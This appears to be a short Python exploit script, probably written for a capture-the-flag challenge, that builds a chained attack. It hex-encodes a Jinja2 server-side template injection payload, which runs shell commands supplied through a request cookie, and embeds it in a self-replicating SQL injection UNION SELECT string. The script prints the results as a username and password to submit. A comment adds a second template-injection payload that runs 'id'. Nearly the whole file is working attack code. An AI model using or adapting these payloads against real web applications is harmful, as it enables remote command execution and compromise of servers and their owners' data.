#   {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# My payload is a reference of https://infosecwriteups.com/ssti-bypassing-single-quotes-filter-dc0ee4e4f011
ssti_payload = "{{url_for.__globals__.os.popen(request.cookies.hack).read()}}\\"    #headers, args, cookies all work
hex_ssti = ssti_payload.encode().hex()

hex_ssti = '0x' + hex_ssti.upper()
frame = f") UNION SELECT {hex_ssti},REPLACE($,0x24,CONCAT(0x3078,HEX($)))#"
hex_frame = frame.encode().hex()
hex_frame = '0x' + hex_frame.upper()
payload = f") UNION SELECT {hex_ssti},REPLACE({hex_frame},0x24,CONCAT(0x3078,HEX({hex_frame})))#"
print('==================================================================\n\n')
print('username:',ssti_payload)
print('\n\n==================================================================\n\n')
print('password:',payload +'\n\n')
    
